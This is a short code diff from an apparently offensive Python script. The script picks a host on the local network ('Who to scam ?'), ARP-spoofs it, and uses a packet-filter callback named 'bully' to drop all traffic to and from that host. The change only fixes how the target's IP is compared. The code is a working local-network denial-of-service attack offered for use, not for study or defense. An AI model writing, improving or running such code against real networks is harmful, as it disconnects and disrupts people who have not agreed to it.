@@ -12,7 +12,7 @@ for i in range(len(targets)):
     print(f"{i} - {targets[i]}")
 
 ans = int(input("Who to scam ? "))
-target = targets[ans].ip
+target = targets[ans]
 print(f"Target: {target}")
 
 a = ARPSpoofer(target)
@@ -24,7 +24,7 @@ def bully(pkt: Packet):
     spkt = IP(pkt.get_payload())
     ip_src=spkt[IP].src
     ip_dst=spkt[IP].dst
-    if (ip_src == target or ip_dst == target):
+    if (ip_src == target.ip or ip_dst == target.ip):
         print("Yeeted ", pkt)
         pkt.drop()
     else:
